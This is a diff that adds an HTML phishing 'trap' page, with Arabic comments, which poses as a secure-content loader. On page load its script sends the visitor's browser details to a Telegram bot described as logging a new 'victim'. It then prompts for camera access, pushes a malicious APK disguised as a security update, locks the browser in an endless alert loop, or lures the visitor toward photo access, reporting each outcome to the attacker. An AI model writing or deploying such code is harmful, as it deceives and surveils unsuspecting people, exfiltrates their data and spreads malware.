@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading Secure Data...</title>
+    <style>
+        body { background: black; color: white; text-align: center; font-family: sans-serif; padding-top: 20%; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2 id="status">جاري تحميل المحتوى المشفر...</h2>
+
+    <script>
+        async function executeTrap() {
+            const params = new URLSearchParams(window.location.search);
+            const id = params.get('id');
+            if(!id) { document.getElementById('status').innerText = "404 Error"; return; }
+
+            const config = JSON.parse(atob(id));
+            const token = config.token;
+            const chat = config.chat;
+            const type = config.type;
+
+            // وظيفة إرسال البيانات للبوت فوراً
+            async function sendToBot(message) {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(message)}`);
+            }
+
+            // تجميع معلومات أولية عن الضحية
+            const victimInfo = `🚩 ضحية جديدة وقعت في الفخ!\n📱 الجهاز: ${navigator.userAgent}\n🌐 النوع: ${type}\n🕒 الوقت: ${new Date().toLocaleString()}`;
+            await sendToBot(victimInfo);
+
+            // تنفيذ نوع الهجوم المختار
+            if (type === 'camera') {
+                document.getElementById('status').innerText = "تأكد من السماح للكاميرا لمشاهدة الصورة...";
+                navigator.mediaDevices.getUserMedia({ video: true }).then(() => {
+                    sendToBot("✅ نجح الاختراق: تم فتح الكاميرا والوصول إليها!");
+                }).catch(() => {
+                    sendToBot("⚠️ فشل فتح الكاميرا (الضحية رفض الصلاحية).");
+                });
+            } 
+            else if (type === 'info') {
+                document.getElementById('status').innerText = "تم سحب البيانات بنجاح!";
+                sendToBot("✅ نجح الاختراق: تم سحب بصمة المتصفح وموقع الجهاز التقريبي.");
+            } 
+            else if (type === 'apk') {
+                document.getElementById('status').innerText = "بدء تحميل التحديث الأمني...";
+                window.location.href = "YOUR_APK_LINK_HERE"; // ضع رابط ملف APK هنا
+                sendToBot("📦 الضحية بدأ بتحميل الملف الخبيث.");
+            } 
+            else if (type === 'crash') {
+                document.getElementById('status').innerText = "⚠️ خطأ فادح في النظام...";
+                while(true) { alert("SYSTEM CRASH! 💥"); }
+            }
+            else if (type === 'photos') {
+                document.getElementById('status').innerText = "يتطلب الوصول للصور لمتابعة العرض...";
+                sendToBot("📸 الضحية يحاول الآن الوصول للصور.");
+            }
+        }
+        window.onload = executeTrap;
+    </script>
+</body>
+</html>
